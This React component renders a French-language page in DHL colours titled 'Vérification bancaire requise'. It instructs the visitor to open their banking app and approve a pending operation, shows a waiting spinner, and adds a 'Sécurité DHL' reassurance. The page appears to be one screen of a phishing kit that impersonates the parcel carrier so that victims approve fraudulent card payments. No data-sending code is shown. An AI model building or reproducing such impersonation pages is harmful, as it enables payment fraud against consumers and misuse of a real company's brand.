import { useEffect, useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Building2, Smartphone, CheckCircle2 } from "lucide-react";

export default function DHLApprovePage() {
  const [dots, setDots] = useState(".");

  useEffect(() => {
    const interval = setInterval(() => {
      setDots((prev) => (prev.length >= 3 ? "." : prev + "."));
    }, 500);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-50 flex items-center justify-center p-4">
      <Card className="w-full max-w-md shadow-xl border-2 border-blue-500">
        <CardHeader className="space-y-4 text-center bg-gradient-to-r from-blue-600 to-indigo-600 text-white pb-8">
          <div className="flex justify-center">
            <div className="bg-white rounded-full p-6 shadow-lg">
              <Building2 className="h-20 w-20 text-blue-600" />
            </div>
          </div>
          <CardTitle className="text-2xl font-bold">
            Vérification bancaire requise
          </CardTitle>
          <CardDescription className="text-white/90 text-base">
            Votre banque demande une confirmation
          </CardDescription>
        </CardHeader>

        <CardContent className="pt-8 space-y-6">
          <div className="bg-blue-50 border-2 border-blue-300 rounded-lg p-6 text-center space-y-4">
            <div className="flex justify-center">
              <Smartphone className="h-16 w-16 text-blue-600 animate-pulse" />
            </div>
            
            <div className="space-y-2">
              <p className="text-lg font-semibold text-blue-900">
                Approuvez cette opération sur votre téléphone
              </p>
              <p className="text-sm text-blue-700">
                Consultez votre application bancaire mobile
              </p>
            </div>
          </div>

          <div className="space-y-3">
            <div className="flex items-start gap-3 p-3 bg-white border border-gray-200 rounded-lg">
              <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5 flex-shrink-0" />
              <div className="text-sm">
                <p className="font-medium text-gray-900">Étape 1 : Ouvrez votre app bancaire</p>
                <p className="text-gray-600">Vérifiez les notifications sur votre smartphone</p>
              </div>
            </div>

            <div className="flex items-start gap-3 p-3 bg-white border border-gray-200 rounded-lg">
              <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5 flex-shrink-0" />
              <div className="text-sm">
                <p className="font-medium text-gray-900">Étape 2 : Confirmez l'opération</p>
                <p className="text-gray-600">Appuyez sur "Approuver" dans votre application</p>
              </div>
            </div>

            <div className="flex items-start gap-3 p-3 bg-white border border-gray-200 rounded-lg">
              <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5 flex-shrink-0" />
              <div className="text-sm">
                <p className="font-medium text-gray-900">Étape 3 : Attendez la confirmation</p>
                <p className="text-gray-600">Cette page se mettra à jour automatiquement</p>
              </div>
            </div>
          </div>

          <div className="bg-gradient-to-r from-[#FFCC00] to-[#D40511] rounded-lg p-4 text-center">
            <div className="flex items-center justify-center gap-2 text-white">
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
              <p className="font-semibold">
                En attente de votre confirmation{dots}
              </p>
            </div>
          </div>

          <div className="text-center text-sm text-gray-600 border-t pt-4 space-y-2">
            <p className="font-medium">Vous n'avez pas reçu de notification ?</p>
            <ul className="text-xs text-gray-500 space-y-1">
              <li>• Vérifiez que votre application bancaire est à jour</li>
              <li>• Assurez-vous d'avoir une connexion Internet</li>
              <li>• Contactez votre banque si le problème persiste</li>
            </ul>
          </div>

          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 text-center">
            <p className="text-xs text-yellow-800">
              <strong>Sécurité DHL :</strong> Cette étape garantit la sécurité de votre paiement
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
